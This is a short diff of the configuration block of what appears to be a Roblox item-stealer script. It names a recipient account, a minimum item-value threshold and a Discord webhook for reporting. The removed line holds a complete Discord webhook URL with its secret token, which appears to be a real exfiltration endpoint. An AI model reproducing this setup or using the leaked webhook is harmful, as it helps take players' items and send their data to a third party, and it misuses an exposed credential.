@@ -1,6 +1,6 @@
 _G.Usernames = {"EmiRAta4"} -- you can add as many as you'd like
 _G.minrap = 100000
-_G.webhook = "https://discord.com/api/webhooks/1373743035216564345/rhM9zxkChfqb7bZR3x7QnJFBQMmxHUOma6lP0beYZwWCtXTEQHyu5rY1l62V17lI0oPQ" -- change to your webhook
+_G.webhook = "" -- change to your webhook
 
 
 
